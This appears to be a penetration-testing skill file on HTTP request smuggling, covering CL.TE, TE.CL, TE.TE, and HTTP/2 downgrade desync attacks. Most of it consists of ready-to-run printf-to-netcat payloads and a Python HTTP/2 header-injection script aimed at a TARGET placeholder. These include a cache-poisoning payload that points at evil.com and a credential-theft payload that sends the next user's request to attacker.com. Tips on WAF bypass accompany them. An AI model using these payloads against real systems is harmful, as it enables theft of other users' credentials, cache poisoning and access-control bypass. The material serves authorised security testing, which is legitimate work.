---
name: http-request-smuggling
description: HTTP request smuggling testing covering CL.TE, TE.CL, TE.TE, HTTP/2 desync, and front-end/back-end splitting attacks
---

# HTTP Request Smuggling

Request smuggling exploits disagreements between front-end proxies (CDN, load balancer, WAF) and back-end servers on how to parse HTTP request boundaries. This leads to request injection, cache poisoning, credential theft, and WAF bypass.

## Attack Surface

- Any application behind a reverse proxy, CDN, load balancer, or WAF
- Nginx + Apache, Cloudflare + Origin, AWS ALB + backend, HAProxy + any backend
- HTTP/1.1 and HTTP/2 → HTTP/1.1 downgrade scenarios

## Reconnaissance

### Detection Signals

- Multiple server/proxy headers (Via, X-Forwarded-For, Server showing different backends)
- CDN indicators: Cloudflare (cf-ray), Akamai (X-Akamai-*), AWS CloudFront
- Load balancer presence: `Server: AkamaiGHost`, `Via: 1.1 varnish`
- Different behavior for Content-Length vs Transfer-Encoding headers

### Fingerprinting

```bash
# Check if both CL and TE are accepted
curl -sk https://TARGET -H "Transfer-Encoding: chunked" -H "Content-Length: 0" -X POST -d "" -v 2>&1 | grep -i "HTTP/"

# Check for proxy chain
curl -sI https://TARGET | grep -iE "via|x-forwarded|x-cache|server|x-served-by|cf-ray"

# Check HTTP/2 support
curl -sI --http2 https://TARGET 2>&1 | head -5
```

## Key Vulnerabilities

### CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

```bash
# Detection probe — if vulnerable, second request gets smuggled
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc TARGET 80

# Exploitation — smuggle a GET to a different path
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 71\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nFoo: bar\r\n\r\n' | nc TARGET 80
```

### TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

```bash
# Detection probe
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5e\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | nc TARGET 80

# If back-end responds to GPOST or returns error for malformed method → vulnerable
```

### TE.TE (Both use TE but parse differently with obfuscation)

```bash
# Obfuscated Transfer-Encoding variants
# Try each to find which front-end ignores and which back-end accepts

# Tab before value
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\n' | nc TARGET 80

# Capitalization
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: Chunked\r\n\r\n0\r\n\r\n' | nc TARGET 80

# Extra whitespace
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding:  chunked\r\n\r\n0\r\n\r\n' | nc TARGET 80

# Newline in header value
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\n' | nc TARGET 80

# Duplicate headers
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\n' | nc TARGET 80

# X prefix
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nX-Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc TARGET 80
```

### HTTP/2 Downgrade Smuggling (H2.CL / H2.TE)

```bash
# HTTP/2 → HTTP/1.1 downgrade at the proxy
# Front-end accepts HTTP/2 (no CL/TE ambiguity in H2)
# But downgrades to HTTP/1.1 for backend, re-introducing CL/TE

# H2.CL — inject Content-Length in HTTP/2 pseudo-headers
curl -sk https://TARGET --http2 -X POST \
  -H "Content-Length: 0" \
  -H "Transfer-Encoding: chunked" \
  --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"

# H2.TE — chunked encoding smuggled through HTTP/2
# Requires raw HTTP/2 frame manipulation (use h2csmuggler or custom tool)
```

### Header Injection via HTTP/2 HPACK

```python
# Using hyper library for raw HTTP/2 frame control
import h2.connection
import h2.config
import socket, ssl

# Connect with HTTP/2
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = socket.create_connection(('TARGET', 443))
sock = ctx.wrap_socket(sock, server_hostname='TARGET')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# Send request with injected headers (newlines in header values)
headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':authority', 'TARGET'),
    (':scheme', 'https'),
    ('transfer-encoding', 'chunked'),  # Smuggled into HTTP/1.1 downstream
]
conn.send_headers(1, headers, end_stream=True)
sock.sendall(conn.data_to_send())
```

## Advanced Techniques

### Smuggling for Cache Poisoning

```bash
# Poison cache by smuggling a request that maps a benign URL to malicious response
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 128\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/main.js HTTP/1.1\r\nHost: TARGET\r\nX-Forwarded-Host: evil.com\r\n\r\n' | nc TARGET 80

# Next legitimate user requesting /static/main.js gets the poisoned response
```

### Smuggling for Credential Theft

```bash
# Smuggle a request that captures the next user's request body
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 200\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /log HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 500\r\n\r\nx=' | nc TARGET 80

# The next user's request gets appended as the body of the smuggled POST
```

### Automated Detection with smuggler

```bash
# Install and run smuggler
python3 smuggler.py -u https://TARGET -m all

# Or use Burp Suite's HTTP Request Smuggler extension
# Or use defparam/smuggler
git clone https://github.com/defparam/smuggler
cd smuggler && python3 smuggler.py -u https://TARGET
```

## Testing Methodology

1. **Fingerprint proxy chain** — identify front-end (CDN/LB) and back-end (origin) from headers
2. **Test CL.TE** — send request with both headers, short CL, check if back-end parses chunked
3. **Test TE.CL** — send chunked request with short CL, check if back-end uses CL
4. **Test TE.TE obfuscation** — try all TE encoding variants (tab, capitalization, duplicates)
5. **Test HTTP/2 downgrade** — if HTTP/2 supported, test H2.CL and H2.TE via curl/hyper
6. **Confirm with timing** — smuggled requests cause the NEXT request to hang or error (differential timing)
7. **Exploit** — once confirmed, demonstrate cache poisoning, credential theft, or access control bypass

## Validation

1. Time differential between normal and smuggled requests (smuggled request causes next request to hang)
2. Response to smuggled request shows different path/endpoint content
3. Cache poisoning demonstrated by serving attacker content for legitimate URL
4. WAF bypassed by smuggling blocked payload past front-end inspection

## False Positives

- Server rejects malformed requests outright (returns 400 immediately)
- Both front-end and back-end agree on parsing (no desync)
- HTTP/2 end-to-end without downgrade
- Single-server setup with no proxy (no front/back-end split)

## Impact

- **Critical**: Request injection → access admin panels, bypass WAF, steal credentials
- **Critical**: Cache poisoning → serve malicious JS to all users (XSS at scale)
- **High**: Response queue poisoning → steal other users' responses
- **High**: WAF bypass → deliver blocked payloads (SQLi, XSS, RCE) past security controls

## Pro Tips

1. Smuggling requires TWO requests — the first "plants" the smuggled prefix, the second triggers it
2. Use timing differences to confirm: send the smuggle, then immediately send a normal request — if it hangs or errors, desync confirmed
3. CL.TE is most common (front-end trusts CL, back-end prefers TE)
4. Test ALL TE obfuscation variants — different proxies normalize differently
5. HTTP/2 downgrade smuggling is increasingly common as H2 adoption grows
6. AWS ALB → EC2 is a known CL.TE vector; Cloudflare → Apache is often TE.CL
7. Always test POST endpoints — GET requests rarely have bodies parsed
8. Watch for 400/500 errors on the SECOND request after your probe — this signals desync
9. Use `turbo-intruder` or custom socket scripts — standard HTTP clients normalize headers
10. Request smuggling findings are almost always P1/Critical on bug bounty platforms
